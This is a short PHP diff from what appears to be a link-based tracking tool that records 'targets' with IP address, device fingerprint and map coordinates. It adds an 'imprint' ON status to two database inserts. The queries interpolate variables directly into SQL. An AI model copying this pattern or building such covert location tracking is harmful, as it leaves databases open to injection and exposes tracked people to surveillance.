@@ -282,7 +282,8 @@ $address = "Here";
 
 $all_info = "{ lat: " . $latitude . ", " . "lng: " . $longitude . ", " . "info: " . "''" . "Device Fingerprint: " . $device_id  . " <br> " . "Address: " . $address . "''" . " }"; 
 
-               
+$imprint = '<font color=green> <b> ON </b> </font>';     
+        
     
 $sql_mode = "select mode, time_of_renewal from system_settings where mode = 'on' and admin = '$admin'";
 $result_mode = $conn->query($sql_mode);
@@ -322,20 +323,20 @@ $result_info = $conn->query($sql_info);
 
         $sql_norm_dev = "insert into targets_group (admin, target_id, target_real, target_desc, 
                                                     link, last_ip, instant, latitude, longitude,  
-                                                    address, fingerprint, all_info) 
+                                                    address, fingerprint, all_info, imprint) 
                          values ('$admin', '$target_id', '$target_real', '$target_desc',
                                  '$target_link', '$last_ip', NOW(), '$latitude', '$longitude',
-                                 '$address', '$fingerprint', '$all_info')";
+                                 '$address', '$fingerprint', '$all_info', '$imprint')";
   
 
 
 
          $sql_back_dev = "insert into backup_targets_group (admin, target_id, target_real, target_desc, 
                                                    link, last_ip, instant, latitude, longitude,  
-                                                    address, fingerprint, all_info) 
+                                                    address, fingerprint, all_info, imprint) 
                          values ('$admin', '$target_id', '$target_real', '$target_desc',
                                  '$target_link', '$last_ip', NOW(), '$latitude', '$longitude',
-                                 '$address', '$fingerprint', '$all_info')";
+                                 '$address', '$fingerprint', '$all_info', 'ON')";
   
 
 
